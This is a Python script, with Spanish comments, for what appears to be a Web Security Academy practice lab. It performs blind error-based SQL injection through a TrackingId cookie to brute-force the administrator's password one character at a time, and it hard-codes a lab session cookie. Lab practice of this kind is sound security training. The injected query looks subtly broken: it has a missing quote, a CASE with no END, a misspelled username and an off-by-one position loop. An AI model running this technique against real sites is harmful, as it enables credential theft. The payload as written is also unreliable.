import requests
import string
from pwn import *
burp0_url = "https://0a22008703a80d5081516682002700e2.web-security-academy.net:443/product?productId=2"



def sqli_inject():
    passwrd = ""
    log1 = log.progress("Fuerza bruta blind sql error based")
    log1.status("VAMOS!")
    log2 = log.progress("Encontramos: ")
    for posicion in range(21): # tamaño contraseña
        for char in string.ascii_letters+string.digits:
            burp0_cookies = {"TrackingId": f"1g4gMl5wSbXhR07Y'||(select case when (substr(password,{posicion},1)='{char} then to_char(1/0) else '' from users where username='admionistrator')||')",  # consulta a inyectar
                              "session": "yXxIFQu1T4TJ4BPCA7EwUW7VaCj7uvLq"} 
            log1.status(burp0_cookies["TrackingId"])
            consulta = requests.get(burp0_url, cookies=burp0_cookies)
            if consulta.status_code == 500:
                passwrd+=char
                log2.status(passwrd)
                break
    return passwrd

if __name__=='__main__':
    sqli_inject()


